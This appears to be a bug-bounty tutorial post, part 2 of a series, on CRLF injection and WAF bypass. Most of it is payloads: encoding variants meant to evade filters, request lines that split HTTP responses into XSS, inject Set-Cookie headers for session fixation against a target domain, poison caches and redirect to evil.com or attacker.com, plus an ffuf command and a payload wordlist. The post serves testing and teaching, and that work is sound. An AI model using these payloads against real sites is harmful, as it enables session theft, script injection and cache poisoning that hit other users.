# 🎓 Part 2/3: CRLF Injection - Advanced Bypass Techniques 🎓
<img width="1200" height="570" alt="Advanced Bypass Techniques" src="https://github.com/user-attachments/assets/3dad2bb3-ab26-4e95-8307-d4a13a77b1e2" />


Now that you understand the basics, let's explore advanced CRLF injection techniques and filter evasion methods. WAFs and input sanitization often block simple %0d%0a sequences—here's how to bypass them.

## 🔥 Filter Evasion Techniques

### 1. Mixed Encoding

```
# Standard
%0d%0a

# Mixed case
%0D%0A
%0d%0A
%0D%0a

# UTF-8 overlong encoding

%C0%8D%C0%8A
```

### 2. Double Encoding

```
# Single encoded
%0d%0a

# Double encoded
%250d%250a

# Triple encoded
%25250d%25250a
```

### 3. Unicode Variants

```
# Unicode Line Separator (U+2028) - sometimes works
%E2%80%A8

# Unicode Paragraph Separator (U+2029)
%E2%80%A9

# Unicode Line Feed
%C2%8A
```
### 4. Alternative CRLF Characters

```
# Just line feed (LF) - some servers accept
%0a

# Just carriage return (CR) - some servers accept
%0d

# Combination with tab
%0d%09%0a

# Windows vs Linux style
%0d%0a (Windows)
%0a (Linux/Unix)
%0d (Mac)
```
### 5. Parameter Pollution

```
# Split injection across parameters
?param1=%0d&param2=%0a

# Multiple CRLFs
%0d%0a%0d%0a
```
### 6. Context-Specific Bypasses

```
# In URL path
/evil%0d%0a/../admin

# In query string
?redirect=http://evil.com%0d%0aX-Forwarded-For: 127.0.0.1

# In POST body
username=admin%0d%0a%0d%0a<script>alert(1)</script>
```

## 🛠 Advanced Exploitation Scenarios

### Scenario 1: HTTP Response Splitting → XSS
```
GET /search?q=test%0d%0aContent-Type:%20text/html%0d%0a%0d%0a%3Cscript%3Ealert(1)%3C/script%3E
```

### Scenario 2: Cookie Injection → Session Fixation
```
GET /redirect?url=https://example.com%0d%0aSet-Cookie:%20sessionid=evil123;%20domain=.target.com
```

### Scenario 3: Cache Poisoning

```
GET /page?lang=en%0d%0aX-Forwarded-For:%20127.0.0.1
```
Poisoned response cached and served to other users


### Scenario 4: Proxy Bypass
```
GET http://internal-service%0d%0aHost:%20attacker.com
```

## 🛡 WAF Detection & Bypass

### Test for WAF Presence:

```
# Monitor response for blocked indicators
GET /param?test=%0d%0a
# If 403/406 → WAF detected
```

### WAF Bypass Patterns:   
- Use chunked encoding with injected CRLF   
- Use HTTP/2 (some WAFs don't inspect HTTP/2 headers)   
- Use different case: %0D%0A  
- Use alternative encodings: %0d%0a vs %0D%0A  
- Use line wrapping: %0d%0a%20%20 (spaces)  
- Use multiple injection points   

### Bypass Example:

```
# Blocked
GET /page?redirect=http://evil.com%0d%0aSet-Cookie:%20session=evil

# Bypass with spacing
GET /page?redirect=http://evil.com%0d%0a%20%20Set-Cookie:%20session=evil
```

## 🎯 Testing Automation

### FFUF Automation:

```
# Test multiple CRLF variants
ffuf -w crlf_payloads.txt -u https://target.com/redirect?url=FUZZ -mr "Set-Cookie"
```

### Custom CRLF Wordlist:

```
%0d%0a
%0D%0A
%0d%0a%0d%0a
%250d%250a
%E2%80%A8
%E2%80%A9
%0d%09%0a
%0a%0d
%0d
%0a
```

🔔 Follow @cybersecplayground for Part 3: Real-World CRLF Exploitation & Reporting!

✅ Like & Share if you've bypassed WAF filters for CRLF! 🔥

#CRLFInjection #WAFBypass #BugBounty #WebSecurity #PenTesting #CyberSecurity #HTTP #Hacking

⚠️ Pro Tip: Always test on multiple browsers—some interpret CRLF differently (especially old versions)!
